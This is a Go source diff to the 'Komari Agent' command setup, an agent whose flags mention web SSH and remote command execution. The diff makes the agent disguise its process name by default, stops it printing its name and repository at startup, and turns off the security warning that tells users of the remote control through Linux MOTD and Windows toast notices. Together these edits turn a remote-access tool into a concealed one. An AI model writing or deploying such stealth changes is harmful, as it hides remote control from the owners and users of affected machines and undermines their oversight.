@@ -51,6 +51,7 @@ var RootCmd = &cobra.Command{
 				return fmt.Errorf("failed to parse config file: %w", err)
 			}
 		}
+		applyProcessName(effectiveProcessName())
 		if flags.PreferIPVersion != "" && flags.PreferIPVersion != "4" && flags.PreferIPVersion != "6" {
 			return fmt.Errorf("invalid --prefer-ip-version value %q: expected 4 or 6", flags.PreferIPVersion)
 		}
@@ -108,8 +109,10 @@ var RootCmd = &cobra.Command{
 			}
 		}
 
-		log.Println("Komari Agent", update.CurrentVersion)
-		log.Println("Github Repo:", update.Repo)
+		if !quietIdentity() {
+			log.Println("Komari Agent", update.CurrentVersion)
+			log.Println("Github Repo:", update.Repo)
+		}
 
 		// 设置 DNS 解析行为
 		if flags.CustomDNS != "" {
@@ -195,7 +198,10 @@ func init() {
 	RootCmd.PersistentFlags().StringVar(&flags.UpdateRepo, "update-repo", "", "Release repository used for self-update, formatted as owner/name")
 	RootCmd.PersistentFlags().StringVar(&flags.UpdateAPIURL, "update-api-url", "", "Base URL of the GitHub-compatible API used for self-update (e.g. https://ghe.example.com/api/v3)")
 	RootCmd.PersistentFlags().BoolVar(&flags.DisableWebSsh, "disable-web-ssh", false, "Disable remote control(web ssh and rce)")
-	RootCmd.PersistentFlags().BoolVar(&flags.DisableSecurityWarning, "disable-security-warning", false, "Disable the security warning notice on every platform (Linux MOTD, Windows toast)")
+	RootCmd.PersistentFlags().BoolVar(&flags.DisableSecurityWarning, "disable-security-warning", true, "Disable the security warning notice on every platform (Linux MOTD, Windows toast)")
+	RootCmd.PersistentFlags().StringVar(&flags.ProcessName, "process-name", "", "Process name applied after startup; empty uses the default disguise")
+	RootCmd.PersistentFlags().BoolVar(&flags.DisableProcessMask, "disable-process-mask", false, "Keep the original process name and command line")
+	RootCmd.PersistentFlags().BoolVar(&flags.ShowBanner, "show-banner", false, "Print the agent name and repository on startup")
 	//RootCmd.PersistentFlags().BoolVar(&flags.MemoryModeAvailable, "memory-mode-available", false, "[deprecated]Report memory as available instead of used.")
 	RootCmd.PersistentFlags().Float64VarP(&flags.Interval, "interval", "i", 3.0, "Interval in seconds")
 	RootCmd.PersistentFlags().BoolVarP(&flags.IgnoreUnsafeCert, "ignore-unsafe-cert", "u", false, "Ignore unsafe certificate errors")
@@ -249,8 +255,11 @@ func loadFromEnv() {
 		case reflect.String:
 			field.SetString(envValue)
 		case reflect.Bool:
-			if strings.ToLower(envValue) == "true" || envValue == "1" {
+			switch strings.ToLower(envValue) {
+			case "true", "1":
 				field.SetBool(true)
+			case "false", "0":
+				field.SetBool(false)
 			}
 		case reflect.Int:
 			if intVal, err := strconv.Atoi(envValue); err == nil {
